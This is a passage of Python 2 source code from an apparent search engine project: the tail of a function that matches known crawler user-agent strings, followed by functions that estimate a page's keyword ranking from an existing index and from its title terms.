    # Screaming Frog SEO Spider/2.22
    # Screaming Frog SEO Spider/2.30
    # Screaming Frog SEO Spider/2.40
    # Screaming Frog SEO Spider/2.50
    # Screaming Frog SEO Spider/2,55
    # Screaming Frog SEO Spider/2.55
    # Screaming Frog SEO Spider/3.1
    # Screaming Frog SEO Spider/3.3
    # Screaming Frog SEO Spider/4.1
    # Screaming Frog SEO Spider/5.0
    if u'Screaming Frog SEO' in text:
        return True
    # 360Spider / HaoSouSpider
    if u'360Spider' in text:
        return True
    # LinkWalker/3.0 (http://www.brandprotect.com)
    if u'LinkWalker' in text:
        return True
    # FRCrawler
    if u'FRCrawler' in text:
        return True
    # SafeAds.xyz bot
    if u'SafeAds.xyz' in text:
        return True
    # mindUpBot (datenbutler.de)
    if u'mindUpBot' in text:
        return True
    # USER_AGENT
    if u'USER_AGENT' in text:
        return True
    # Delphi 2009
    if u'Delphi 2009' in text:
        return True
    # WeSEE:Ads/PageBot (http://www.wesee.com/bot/)
    if u'WeSEE:Ads/PageBot' in text:
        return True
    # btcrawler
    if u'btcrawler' in text:
        return True
    # Mozilla/5.0 (compatible; SEOdiver/1.0; +http://www.seodiver.com/bot)
    if u'SEOdiver' in text:
        return True
    # Mozilla/5.0 (compatible; DomainAppender /1.0; +http://www.profound.net/domainappender)
    if u'DomainAppender' in text:
        return True
    # SafeSearch microdata crawler (https://safesearch.avira.com, safesearch-abuse@avira.com)
    if u'SafeSearch microdata crawler' in text:
        return True
    # BusinessBot: Nathan@lead-caddy.com
    if u'BusinessBot' in text:
        return True
    # Mozilla/5.0 (compatible; SeznamBot/3.2-test1; +http://fulltext.sblog.cz/)
    if u'SeznamBot' in text:
        return True
    # Twitterbot/1.0
    if u'Twitterbot' in text:
        return True
    # Sistrix
    if u'Sistrix' in text:
        return True
    # Mozilla/5.0 (Windows NT 6.1) (compatible; SMTBot/1.0; +http://www.similartech.com/smtbot)
    if u'SMTBot' in text:
        return True
    # linkapediabot (+http://www.linkapedia.com)
    if u'linkapediabot' in text:
        return True
    # http://www.checkprivacy.or.kr:6600/RS/PRIVACY_ENFAQ.jsp
    if u'checkprivacy.or.kr' in text:
        return True
    # Mozilla/5.0 (compatible; NetSeer crawler/2.0; +http://www.netseer.com/crawler.html; crawler@netseer.com)
    if u'NetSeer' in text:
        return True
    # Faraday v0.9.1
    # Faraday v0.9.2
    if u'Faraday v' in text:
        return True
    # Jakarta Commons-HttpClient/3.1
    if u'Jakarta Commons-HttpClient' in text:
        return True
    # Mozilla/5.0 Moreover/5.1 (+http://www.moreover.com; webmaster@moreover.com)
    if u'Moreover/' in text:
        return True
    # Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)
    if u'BLEXBot' in text:
        return True
    # HubPages V0.2.2 (http://hubpages.com/help/crawlingpolicy)
    if u'HubPages' in text:
        return True
    # Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv 11.0) like Gecko (compatible; Zombiebot/2.1; +http://www.zombiedomain.net/robot/)
    if u'Zombiebot' in text:
        return True
    # Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0 ; Claritybot)
    if u'Claritybot' in text:
        return True
    # istellabot/Nutch-1.10
    if u'istellabot' in text:
        return True
    # WikiDo/1.1 (http://wikido.com; crawler@wikido.com)
    if u'WikiDo' in text:
        return True
    return False

def CalculatePageRankForExistingTerm(siteinfo, keywords, lang='en', verbose=False):
    """
    Grabs an existing IndexTerm for the specified keyword. Raises ValueError if those
    keywords are not indexed yet.

    Takes a page (SiteInfo) and calculates what its score would be for a particular keyword.

    Then checks the existing IndexTerm to see what position the page would rank in the
    search results. Returns the position where it would rank in the existing IndexTerm's
    results, otherwise returns zero to indicate that it would not rank.
    """
    try:
        index_lang = GetIndexModelFromLanguage(lang)
        existing = index_lang.objects.get(keywords=keywords)
    except ObjectDoesNotExist:
        raise ValueError(u"Keywords '{0}' not found.".format(keywords))
    result = CalculateTermValue(siteinfo, keywords, lang=lang, verbose=False)
    if verbose:
        print u'Term {0} value for {1} is {2}'.format(keywords, siteinfo.url, result)
        reasons = CalculateTermValue(siteinfo, keywords, lang=lang, verbose=True)
        print u'Term {0} reasons for {1} is {2}'.format(keywords, siteinfo.url, reasons)
    search_results = ujson.loads(existing.search_results)
    rank = 0
    for idx, item in enumerate(search_results):
        if verbose and idx == 0:
            print u'Index {0} score is {1}'.format(idx, item[1]['score'])
        if item[1]['score'] < result:
            rank = idx
            break
    if verbose:
        print u'Page {0} would rank {1} for {2}'.format(siteinfo.url, rank, keywords)
    return rank

def SplitTitleAndGetPageRanks(siteinfo, minlength=3):
    """
    Takes a site info, splits its page title into keywords, then gets the page ranks for each of those words.
    """
    terms = siteinfo.pagetitle.split(' ')
    # Here we remove all English stopwords. TODO: Remove based on languages and add
    # language parameter to this function
    stop = stopwords.words('english')
    terms = [i for i in terms if i not in stop]
    results = []
    need_to_index = []
    notfound = []
    for term in terms:
        term = term.lower()
        if len(term) < minlength:
            continue
        try:
            place = CalculatePageRankForExistingTerm(siteinfo, term, lang='en', verbose=False)
            results.append(u'{0} = {1}'.format(term, place))
            if place != 0 and place <= 200:
                need_to_index.append(term)
        except ValueError, e:
            notfound.append(term)
            try:
                print e
            except:
                print 'ValueError - one of the words in the title was not found, but it is unprintable.'
    for result in results:
        print result
    return need_to_index
